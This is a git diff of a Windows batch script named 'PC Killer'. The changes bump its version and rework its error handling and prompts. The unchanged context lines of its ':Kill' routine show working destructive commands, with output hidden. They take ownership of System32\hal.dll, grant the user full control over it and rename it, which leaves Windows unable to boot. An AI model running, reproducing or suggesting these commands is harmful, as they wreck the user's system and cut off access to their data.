@@ -2,7 +2,7 @@
 title PC Killer
 setlocal
 echo Program Name: PC Killer
-echo Version: 1.4.0
+echo Version: 1.4.1
 echo License: GNU General Public License v3.0
 echo Developer: @YonatanReuvenIsraeli
 echo GitHub: https://github.com/YonatanReuvenIsraeli
@@ -55,6 +55,7 @@ pause > nul 2>&1
 goto "Exit"
 
 :"Kill"
+echo This PC can be killed by this batch file.
 "%windir%\System32\takeown.exe" /f "%windir%\System32\hal.dll" > nul 2>&1
 "%windir%\System32\icacls.exe" "%windir%\System32\hal.dll" /grant "%USERNAME%":(f) > nul 2>&1
 ren "%windir%\System32\hal.dll" "hal" > nul 2>&1
@@ -64,8 +65,9 @@ endlocal
 exit
 
 :"Error"
-echo There has been an error! You can try again.
-goto "Disclaimer"
+echo There has been an error! Press any key to try again.
+pause > nul 2>&1
+goto "CheckKill"
 
 :"Exit"
 endlocal
